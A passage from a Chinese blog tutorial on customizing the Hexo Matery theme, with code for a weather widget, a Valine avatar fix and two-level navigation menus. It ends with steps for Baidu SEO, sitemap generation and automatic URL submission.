shw2018 add 2019.09.09 --&gt;&lt;% if (theme.weather.enable) &#123; %&gt;  &lt;%- partial(&#39;_widget/weather&#39;) %&gt;&lt;% &#125; %&gt;</code></pre><p>Js</p><p>在主题配置文件 .yml中配置:</p><pre><code># 天气接口插件weather:  enable: true</code></pre><p>Yml</p><p>展示效果可以参考我的<a href="https://sunhwee.com/">主页</a></p><p><strong>当然,如果你不想搞这么复杂,可以直接将下面代码插入 /themes/matery/layout/_partial/layout.ejs 中即可使用:</strong></p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;    WIDGET = &#123;FID: &#39;1tFpFZ5Mtj&#39;&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://apip.weatherdt.com/float/static/js/r.js?v=1111&quot;&gt;&lt;/script&gt;</code></pre><p>Html</p><h3 id="2-19-修复-Valine-头像不显示问题"><a href="#2-19-修复-Valine-头像不显示问题" class="headerlink" title="2.19 修复 Valine 头像不显示问题"></a>2.19 修复 Valine 头像不显示问题</h3><p>关于头像显示问题，先去注册<a href="https://cn.gravatar.com/">Gravatar</a>，之前看文档说是七天的同步时间，结果一直也没有显示头像，检查查看头像链接，发现把&amp;v=1.3.x 去掉就可以了，于是下载 js 文件 valine，下载后然后编辑，搜索关键字 <code>&amp;v=</code>，找到 g.params=”?d=”+i.indexOf(ai.indexOf(a&gt;-1?a:”mp”)+”&amp;v=”+o+d，将 <code>&quot;&amp;v=&quot;+o+d</code> 删除即可，然后在 Gravatar 拿到头像的 <code>url</code> 填上去就行了</p><pre><code>valine:  enable: true  appId:   appKey:   notify: true  verify: true  visitor: true  # avatar: &#39;mp&#39; # Gravatar style : mm/identicon/monsterid/wavatar/retro/hide  avatar: https://s.gravatar.com/avatar/0007991f99268c04f1aa4cdd9bea93b4?s=80   pageSize: 10  placeholder: &#39;没有Github账号的在这里留言评论～&#39; # Comment Box placeholder</code></pre><p>Yml</p><p>原因就是链接后跟了个 <code>&amp;v=1.3.x</code>，解决就是将这段删掉就可以了，具体到 <code>Valine.mini.js</code> 文件就是删掉 <code>&amp;v=&quot;+o+d</code>即可</p><h3 id="2-20-增加二级菜单"><a href="#2-20-增加二级菜单" class="headerlink" title="2.20 增加二级菜单"></a>2.20 增加二级菜单</h3><p>都知道，我们标题栏宽度有限，我们项目一多了，就放不下了，这时候你肯定就需要一个二级菜单来拆分一下项目，既可以减少标题栏项目数，使之更加清爽，又可以间项目分类，逻辑清晰。</p><p>好了，如果你用的matery主题，那么废话不多说，直接上教程，其实需要修改的就四个地方：matery.css/matery.js/navgation.ejs/mobile-nav.ejs</p><p>第一步，在 /themes/matery/layout/_partial 中找到 mobile-nav.ejs ，找到下面这段代码：</p><pre><code>&lt;ul class=&quot;menu-list mobile-menu-list&quot;&gt;    &lt;% Object.keys(theme.menu).forEach(function(key) &#123; %&gt;    &lt;li&gt;        &lt;a href=&quot;&lt;%- theme.menu[key].url %&gt;&quot; class=&quot;waves-effect waves-light&quot;&gt;            &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) &#123; %&gt;            &lt;i class=&quot;fa fa-fw &lt;%- theme.menu[key].icon %&gt;&quot;&gt;&lt;/i&gt;            &lt;% &#125; else &#123; %&gt;            &lt;i class=&quot;fa fa-fw fa-link&quot;&gt;&lt;/i&gt;            &lt;% &#125; %&gt;            &lt;%- (config.language === &#39;zh-CN&#39; &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;        &lt;/a&gt;    &lt;/li&gt;    &lt;% &#125;); %&gt;    &lt;% if (theme.githubLink &amp;&amp; theme.githubLink.enable) &#123; %&gt;    &lt;li&gt;&lt;div class=&quot;divider&quot;&gt;&lt;/div&gt;&lt;/li&gt;    &lt;li&gt;        &lt;a href=&quot;&lt;%- theme.githubLink.url %&gt;&quot; class=&quot;waves-effect waves-light&quot; target=&quot;_blank&quot;&gt;            &lt;i class=&quot;fa fa-github-square fa-fw&quot;&gt;&lt;/i&gt;&lt;%- theme.githubLink.title %&gt;        &lt;/a&gt;    &lt;/li&gt;    &lt;% &#125; %&gt;&lt;/ul&gt;</code></pre><p>Js</p><p>替换成下面的：</p><!-- 支持二级菜单特性 洪卫 shw2018 modify 2019.09.17  --> <ul class="menu-list mobile-menu-list">     <% Object.keys(theme.menu).forEach(function(key) { %>         <li class="m-nav-item">                 <% if(!theme.menu[key].children) { %>                     <a href="<%- theme.menu[key].url %>" class="waves-effect waves-light">                         <% if (theme.menu[key].icon && theme.menu[key].icon.length > 0) { %>                         <i class="fa fa-fw <%- theme.menu[key].icon %>"></i>                         <% } else { %>                         <i class="fa fa-fw fa-link"></i>                         <% } %>                         <%- (config.language === 'zh-CN' && menuMap.has(key)) ? menuMap.get(key) : key %>                     </a>               <% } else { %>                     <a href="javascript:;">                             <% if (theme.menu[key].icon && theme.menu[key].icon.length > 0) { %>                             <i class="fa fa-fw <%- theme.menu[key].icon %>"></i>                             <% } else { %>                             <i class="fa fa-fw fa-link"></i>                             <% } %>                             <%- (config.language === 'zh-CN' && menuMap.has(key)) ? menuMap.get(key) : key %>                             <span class="m-icon"><i class="fa fa-chevron-right"></i></span>                     </a>                 <ul>                   <% for(let childrenLink of theme.menu[key].children){ %>                     <li>                        <a href="<%- url_for(childrenLink.url)%>" >                            <% if (childrenLink.icon && childrenLink.icon.length > 0) { %>                             <i class="fa <%- childrenLink.icon %>" style="left: 25px; position: absolute;"></i>                        <% } %>                        <span><%- childrenLink.name %></span>                       </a>                     </li>                   <% } %>                  </ul>               <% } %>             </li>         <% }); %>      <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>githubLink <span class="token operator">&amp;&amp;</span> theme<span class="token punctuation">.</span>githubLink<span class="token punctuation">.</span>enable<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"divider"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>         <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"&lt;%- theme.githubLink.url %&gt;"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"waves-effect waves-light"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">&gt;</span>             <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fa fa-github-square fa-fw"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> theme<span class="token punctuation">.</span>githubLink<span class="token punctuation">.</span>title <span class="token operator">%</span><span class="token operator">&gt;</span>         <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>   <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span></ul><p>Js</p><p>第二步，在 /themes/matery/layout/_partial 中找到 navagtion.ejs ，找到下面这段代码：</p><pre><code>&lt;a href=&quot;#&quot; data-target=&quot;mobile-nav&quot; class=&quot;sidenav-trigger button-collapse&quot;&gt;&lt;i class=&quot;fa fa-navicon&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;ul class=&quot;right&quot;&gt;    &lt;% Object.keys(theme.menu).forEach(function(key) &#123; %&gt;    &lt;li class=&quot;hide-on-med-and-down&quot;&gt;        &lt;a href=&quot;&lt;%- theme.menu[key].url %&gt;&quot; class=&quot;waves-effect waves-light&quot;&gt;            &lt;% if (theme.menu[key].icon &amp;&amp; theme.menu[key].icon.length &gt; 0) &#123; %&gt;            &lt;i class=&quot;fa &lt;%- theme.menu[key].icon %&gt;&quot;&gt;&lt;/i&gt;            &lt;% &#125; %&gt;            &lt;span&gt;&lt;%- (config.language === &#39;zh-CN&#39; &amp;&amp; menuMap.has(key)) ? menuMap.get(key) : key %&gt;&lt;/span&gt;        &lt;/a&gt;    &lt;/li&gt;    &lt;% &#125;); %&gt;    &lt;li&gt;        &lt;a href=&quot;#searchModal&quot; class=&quot;modal-trigger waves-effect waves-light&quot;&gt;            &lt;i id=&quot;searchIcon&quot; class=&quot;fa fa-search&quot; title=&quot;&lt;%= __(&#39;search&#39;) %&gt;&quot;&gt;&lt;/i&gt;        &lt;/a&gt;    &lt;/li&gt;&lt;/ul&gt;</code></pre><p>Js</p><p>替换成下面的：</p><!-- 支持二级菜单特性 洪卫 shw2018 modify 2019.09.17  --> <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a> <ul class="right nav-menu">     <% Object.keys(theme.menu).forEach(function(key) { %>       <li class="hide-on-med-and-down nav-item" >      <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>theme<span class="token punctuation">.</span>menu<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>children<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>         <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"&lt;%- theme.menu[key].url %&gt;"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"waves-effect waves-light"</span><span class="token operator">&gt;</span>           <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>menu<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>icon <span class="token operator">&amp;&amp;</span> theme<span class="token punctuation">.</span>menu<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>icon<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>             <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fa &lt;%- theme.menu[key].icon %&gt;"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">&gt;</span>           <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>           <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>language <span class="token operator">===</span> <span class="token string">'zh-CN'</span> <span class="token operator">&amp;&amp;</span> menuMap<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> menuMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">:</span> key <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>         <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>          <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>           <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"&lt;%- theme.menu[key].url %&gt;"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"waves-effect waves-light"</span><span class="token operator">&gt;</span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>theme<span class="token punctuation">.</span>menu<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>icon <span class="token operator">&amp;&amp;</span> theme<span class="token punctuation">.</span>menu<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>icon<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>               <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fa &lt;%- theme.menu[key].icon %&gt;"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">&gt;</span>             <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>             <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>language <span class="token operator">===</span> <span class="token string">'zh-CN'</span> <span class="token operator">&amp;&amp;</span> menuMap<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> menuMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">:</span> key <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>             <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fa fa-chevron-down"</span> aria<span class="token operator">-</span>hidden<span class="token operator">=</span><span class="token string">"true"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">&gt;</span>           <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>          <span class="token operator">&lt;</span>ul <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"sub-nav menus_item_child "</span><span class="token operator">&gt;</span>           <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> childrenLink <span class="token keyword">of</span> theme<span class="token punctuation">.</span>menu<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>children<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>             <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"&lt;%- url_for(childrenLink.url)%&gt;"</span> <span class="token operator">&gt;</span>                 <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>childrenLink<span class="token punctuation">.</span>icon <span class="token operator">&amp;&amp;</span> childrenLink<span class="token punctuation">.</span>icon<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>                   <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fa &lt;%- childrenLink.icon %&gt;"</span> style<span class="token operator">=</span><span class="token string">"margin-top: -20px;"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">&gt;</span>                 <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>                 <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">-</span> childrenLink<span class="token punctuation">.</span>name <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>               <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>             <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>           <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>          <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>       <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>   <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>li<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"#searchModal"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"modal-trigger waves-effect waves-light"</span><span class="token operator">&gt;</span>         <span class="token operator">&lt;</span>i id<span class="token operator">=</span><span class="token string">"searchIcon"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"fa fa-search"</span> title<span class="token operator">=</span><span class="token string">"&lt;%= __('search') %&gt;"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span></ul><p>Js</p><p>第三步，在 /themes/matery/source/css 中找到 matery.css ，在最后添加下面这段代码：</p><pre><code>/* 二级菜单样式定义 洪卫 shw2018 add 2019.09.17 */.nav-menu &#123;&#125;.nav-menu li .sub-nav &#123;    position: absolute;    top: 77px;    list-style: none;    margin-left: -20px;    display: none;&#125;.nav-menu li .sub-nav li &#123;    text-align: center;    clear: left;    width: 140px;    height: 35px;    line-height: 35px;    position: relative;&#125;.nav-menu li .sub-nav li a &#123;    height: 34px;    line-height: 34px;    width: 138px;    padding: 0px;    display: inline-block;    border-radius: 5px;    color: #000;&#125;.nav-show i[aria-hidden=true] &#123;    -webkit-transform: rotate(180deg) !important;    -moz-transform: rotate(180deg) !important;    -o-transform: rotate(180deg) !important;    -ms-transform: rotate(180deg) !important;    transform: rotate(180deg) !important;    -webkit-transition: all .3s;    -moz-transition: all .3s;    -o-transition: all .3s;    -ms-transition: all .3s;    transition: all .3s;&#125;.menus_item_child &#123;    background-color: rgba(255, 255, 255, .8);    width: fit-content;    border-radius: 10px;    -webkit-box-shadow: 0 5px 20px -4px rgba(0, 0, 0, .5);    box-shadow: 0 5px 20px -4px rgba(0, 0, 0, .5);    display: none;    opacity: 0.98;    -ms-filter: none;    filter: none;    -webkit-animation: sub_menus .3s .1s ease both;    -moz-animation: sub_menus .3s .1s ease both;    -o-animation: sub_menus .3s .1s ease both;    -ms-animation: sub_menus .3s .1s ease both;    animation: sub_menus .3s .1s ease both;&#125;.menus_item_child:before &#123;    content: &quot;&quot;;    position: absolute;    top: -20px;    left: 50%;    margin-left: -10px;    border-width: 10px;    border-style: solid;    border-color: transparent transparent rgba(255, 255, 255, .8)&#125;.m-nav-item &#123;    /* position: relative; */    left: 45px&#125;.m-nav-item ul &#123;    display: none;    background: rgba(255, 255, 255, .1);&#125;.m-nav-item ul li &#123;    width: 245px;    height: 50px;    line-height: 50px;    text-align: center;&#125;.m-nav-show .m-icon &#123;    -webkit-transform: rotate(90deg) !important;    -moz-transform: rotate(90deg) !important;    -o-transform: rotate(90deg) !important;    -ms-transform: rotate(90deg) !important;    transform: rotate(90deg) !important;    -webkit-transition: all .3s;    -moz-transition: all .3s;    -o-transition: all .3s;    -ms-transition: all .3s;    transition: all .3s;&#125;.m-nav-show .m-nav-item&gt;a:hover &#123;    color: #FFF;    background: rgba(255, 255, 255, .8);&#125;.m-nav-show&gt;a:before,.m-nav-item&gt;a:hover:before &#123;    opacity: 1;&#125;.m-nav-item .m-icon &#123;    position: absolute;    right: 65px;    height: 50px;    padding: 0px;    margin: 0px;&#125;.nav-item li:hover a &#123;    color: #FFF;    background: rgba(0, 0, 0, .1);&#125;</code></pre><p>Css</p><p>第四步，在 /themes/matery/source/js 中找到 matery.js ，在最后一个 <code>&#125;);</code>前添加下面这段代码：</p><p>// 增加二级菜单功能 洪卫 shw2018 add 2019.09.17     $(“.nav-menu&gt;li”).hover(function(){         $(this).children(‘ul’).stop(true,true).show();         $(this).addClass(‘nav-show’).siblings(‘li’).removeClass(‘nav-show’);  <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token string">‘ul’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">‘.nav-item.nav-show’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">‘nav-show’</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">‘.m-nav-item&gt;a’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">‘click’</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token string">‘ul’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">‘display’</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">“none”</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">‘.m-nav-item’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">children</span><span class="token punctuation">(</span><span class="token string">‘ul’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideUp</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token string">‘ul’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideDown</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parent</span><span class="token punctuation">(</span><span class="token string">‘li’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">‘m-nav-show’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">siblings</span><span class="token punctuation">(</span><span class="token string">‘li’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">‘m-nav-show’</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token string">‘ul’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideUp</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">‘.m-nav-item.m-nav-show’</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">removeClass</span><span class="token punctuation">(</span><span class="token string">‘m-nav-show’</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="code_lang" title="代码语言">Js</div></div>第五步，在主题配置文件.yml修改标题栏内容，按下面格式更改:   标题一级:      url: /XXX     icon: fa-XXXX     children:        -         name: 标题二级1         url: /XXX/XXX         icon: fa-XXXX       -         name: 标题二级2         url: /XXX/XXX         icon: fa-XXXXYml 第六步，source 文件夹新疆对应的标题目录，并放 index.md 模板就行了。 到这一步就大功告成了，快去体验吧。  第三部分 优化 hexo添加各种优化功能，比如SEO优化等。待续…… 1. 网站SEO优化 网站推广是一个比较烦人的事情，特别是对于专心搞技术的来说，可能就不是很擅长，那么怎么才能让别人知道我们网站呢？也就是说我们需要想办法让别人通过搜索就可以搜索到博客的内容，给我们带来自然流量，这就需要seo优化,让我们的站点变得对搜索引擎友好  SEO是由英文Search Engine Optimization缩写而来， 中文意译为“搜索引擎优化”。SEO是指通过站内优化比如网站结构调整、网站内容建设、网站代码优化等以及站外优化。  1.1 让百度收录你的站点 首先要做的就是让各大搜索引擎收录你的站点，我们在刚建站的时候各个搜索引擎是没有收录我们网站的，在搜索引擎中输入site:&lt;域名&gt;,如果如下图所示就是说明我们的网站并没有被百度收录。我们可以直接点击下面的“网址提交”来提交我们的网站查看站点是否被百度收录 1.1.1 验证网站所有权 登录百度站长搜索资源平台：<a href="http://zhanzhang.baidu.com,/">http://zhanzhang.baidu.com，</a> 只要有百度旗下的账号就可以登录，登录成功之后在站点管理中点击添加网站然后输入你的站点地址。  注意，这里需要输入我们自己购买的域名,不能使用xxx.github.io之类域名.因为github是不允许百度的spider（蜘蛛）爬取github上的内容的，所以如果想让你的站点被百度收录，只能使用自己购买的域名  向百度站长添加网站 在填完网址选择完网站的类型之后需要验证网站的所有权，验证网站所有权的方式有三种：  文件验证。 html标签验证 CNAME解析验证（推荐使用）  验证网站所有权 其实使用哪一种方式都可以，都是比较简单的。  但是一定要注意，使用文件验证文件存放的位置需要放在sourc文件夹下，如果是html文件那么hexo就会将其编译，所以必须要在html头部加上的layout:false，这样就不会被hexo编译。（如果验证文件是txt格式的就不需要）  其他两种方式也是很简单的，个人推荐文件验证和CNAME验证，CNAME验证最为简单，只需加一条解析就好<del>添加云解析验证通过 1.1.2 生成网站地图 我们需要使用npm自动生成网站的sitemap，然后将生成的sitemap提交到百度和其他搜索引擎 1.1.2.1 安装sitemap插件 npm install hexo-generator-sitemap –save      npm install hexo-generator-baidu-sitemap –saveBash 1.1.2.2 修改博客配置文件 在根目录配置文件.yml中修改url为你的站点地址 # URL ## If your site is put in a subdirectory, set url as ‘<a href="http://yoursite.com/child&#39;">http://yoursite.com/child&#39;</a> and root as ‘/child/‘ # url: <a href="https://shw2018.github.io/">https://shw2018.github.io/</a> url: <a href="https://sunhwee.com/">https://sunhwee.com</a> root: / permalink: :year/:month/:day/:title/ permalink_defaults:Yml 执行完hexo g命令之后就会在网站根目录生成sitemap.xml文件和baidusitemap.xml文件，可以通过：<a href="https://sunhwee.com/baidusitemap.xml">https://sunhwee.com/baidusitemap.xml</a>,  查看该文件是否生成，其中sitemap.xml文件是搜索引擎通用的文件，baidusitemap.xml是百度专用的sitemap文件。 1.1.3 向百度提交链接 然后我们就可以将我们生成的sitemap文件提交给百度，还是在百度站长平台，找到链接提交，这里我们可以看到有两种提交方式，自动提交和手动提交，自动提交又分为主动推送、自动推送和sitemap  如何选择链接提交方式  主动推送：最为快速的提交方式，推荐您将站点当天新产出链接立即通过此方式推送给百度，以保证新链接可以及时被百度收录。 自动推送：最为便捷的提交方式，请将自动推送的JS代码部署在站点的每一个页面源代码中，部署代码的页面在每次被浏览时，链接会被自动推送给百度。可以与主动推送配合使用。 sitemap：您可以定期将网站链接放到sitemap中，然后将sitemap提交给百度。百度会周期性的抓取检查您提交的sitemap，对其中的链接进行处理，但收录速度慢于主动推送。 手动提交：一次性提交链接给百度，可以使用此种方式。   一般主动提交比手动提交效果好，这里介绍主动提交的三种方法 从效率上来说：  主动推送&gt;自动推送&gt;sitemap  连接提交 1.1.3.1 设置主动推送 安装插件hexo-baidu-url-submit npm install hexo-baidu-url-submit –saveBash 然后再根目录的配置文件中新增字段 baidu_url_submit:   count: 80             # 提交最新的一个链接   host: <a href="http://www.sunhwee.com/">www.sunhwee.com</a> # 在百度站长平台中注册的域名   token: xxxxxxxxxxxxxx # 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!   path: baidu_urls.txt  # 文本文档的地址， 新链接会保存在此文本文档里Yml 再加入新的deploy： deploy: - type: baidu_url_submitterYml 如图所示：   注意,这里多个 type 的写法应该这么写**,前面那个 type 是我推送到 Github 与 Coding的page页面的配置,后面再讲这个。  密钥的获取位置在网页抓取中的链接提交这一块,如下所示:token获取 这样执行hexo deploy的时候，新的链接就会被推送了。 